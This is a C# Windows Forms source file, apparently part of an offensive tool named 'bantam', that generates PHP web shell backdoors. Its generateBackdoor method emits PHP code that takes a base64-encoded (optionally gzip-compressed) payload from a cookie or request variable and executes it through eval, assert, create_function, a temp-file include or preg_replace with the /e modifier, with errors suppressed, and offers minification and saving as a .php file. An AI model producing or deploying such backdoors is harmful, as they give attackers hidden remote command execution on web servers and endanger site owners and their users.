using System;
using System.IO;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    /// <summary>
    /// 
    /// </summary>
    public enum BackdoorTypes
    {
        EVAL = 0,
        ASSERT,
        CREATE_FUNCTION,
        NATIVE_ANON,
        TMP_INCLUDE,
        PREG_REPLACE
    }

    public partial class BackdoorGenerator : Form
    {
        public BackdoorGenerator()
        {
            InitializeComponent();

            comboBoxMethod.SelectedIndex = 0;
            comboBoxVarType.SelectedIndex = 0;

            richTextBoxBackdoor.Text = generateBackdoor();
        }

        public void UpdateForm()
        {
            string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, chckbxGzipDecodeRequest.Checked, (BackdoorTypes)comboBoxMethod.SelectedIndex);

            if (chkbxMinifyCode.Checked) {
                backdoorCode = Helper.MinifyCode(backdoorCode);
            }

            richTextBoxBackdoor.Text = backdoorCode;
        }

        public string generateBackdoor(string varName = "command", string varType = "COOKIE", bool gzInflateRequest = false, BackdoorTypes backdoorType = BackdoorTypes.EVAL)
        {
            string backdoorResult = string.Empty;
            string gzInflateStart = string.Empty;
            string gzInflateEnd = string.Empty;

            varType = varType.ToUpper();

            if (gzInflateRequest) {
                gzInflateStart = "@gzinflate(";
                gzInflateEnd = ")";
            }

            switch (backdoorType) {
                case BackdoorTypes.EVAL: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])"+ gzInflateEnd + ");\r\n}";
                        break;
                    }

                case BackdoorTypes.ASSERT: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n}";
                        break;
                    }

                case BackdoorTypes.CREATE_FUNCTION: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n\t$a();\r\n}";
                        break;
                    }

                case BackdoorTypes.NATIVE_ANON: {
                        backdoorResult = "todo";
                        break;
                    }

                case BackdoorTypes.TMP_INCLUDE: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '." + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
                        break;
                    }

                case BackdoorTypes.PREG_REPLACE: {
                        //todo this looks wrong af and doesnt support gzip
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "']" + gzInflateEnd + "),'.');\r\n}";
                        break;
                    }
            }

            if (chkbxMinifyCode.Checked) {
                backdoorResult = Helper.MinifyCode(backdoorResult);
            }
            return backdoorResult;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void txtBoxVarName_TextChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chkbxUseCookie_CheckStateChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chckbxGzipDecodeRequest_CheckedChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chkbxMinifyCode_CheckedChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void comboBoxVarType_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void saveAsToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();

            saveFileDialog1.Filter = "All files (*.*)|*.*|php files (*.php)|*.php";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;

            if (saveFileDialog1.ShowDialog() == DialogResult.OK) {
                File.WriteAllText(saveFileDialog1.FileName, richTextBoxBackdoor.Text);
            }
        }

        private void BackdoorGenerator_FormClosed(object sender, FormClosedEventArgs e)
        {
            Program.g_BantamMain.backdoorGenerator = null;
        }
    }
}
